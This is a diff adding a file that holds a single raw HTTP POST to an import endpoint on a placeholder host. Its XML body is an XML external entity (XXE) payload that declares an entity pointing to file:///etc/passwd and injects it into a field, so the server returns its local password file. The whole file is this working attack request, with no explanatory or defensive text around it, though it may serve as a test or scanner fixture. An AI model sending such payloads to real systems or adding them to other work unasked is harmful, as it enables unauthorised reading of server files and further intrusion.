@@ -1,0 +1,10 @@
+POST /api/v1/import HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Type: application/xml
+Content-Length: 131
+Accept: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><name>&xxe;</name></root>
